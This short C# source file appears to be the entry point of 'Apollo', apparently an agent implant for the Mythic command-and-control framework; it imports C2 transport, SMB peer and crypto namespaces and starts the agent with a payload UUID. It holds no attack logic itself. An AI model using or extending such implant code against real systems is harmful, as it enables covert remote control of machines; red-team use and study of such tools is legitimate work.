using System;
using PSKCryptography;
using HttpTransport;
using ApolloInterop.Serializers;
using System.Collections.Generic;
using ApolloInterop.Structs.MythicStructs;
using Apollo.Agent;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using System.Text;
using System.Threading;
using Apollo.Peers.SMB;
using System.Linq;
using System.Collections.Concurrent;
using System.Runtime.InteropServices;

namespace Apollo
{
    class Program
    {
        static void Main(string[] args)
        {
            // This is main execution.
            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
            ap.Start();
        }
    }
}
